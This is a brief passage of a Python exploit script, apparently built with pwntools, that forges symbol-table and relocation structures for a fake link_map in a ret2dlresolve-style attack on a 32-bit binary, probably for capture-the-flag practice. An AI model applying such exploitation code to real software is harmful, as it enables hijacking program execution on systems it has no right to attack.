...
fake_symtab = p32(6) + p32(exe.got.__libc_start_main) + p32(0) + p32(0x0300)
fake_jmprel = p32(fake_link_map_addr + len(fake) - offset_2_addr)  + p32(0x7) # Rinfo


print(f"FAKE JMPREL: {hex(len(fake) + fake_link_map_addr)}")
fake += fake_jmprel
print(f"FAKE SYMTAB: {hex(len(fake) + fake_link_map_addr)}")
fake += fake_symtab
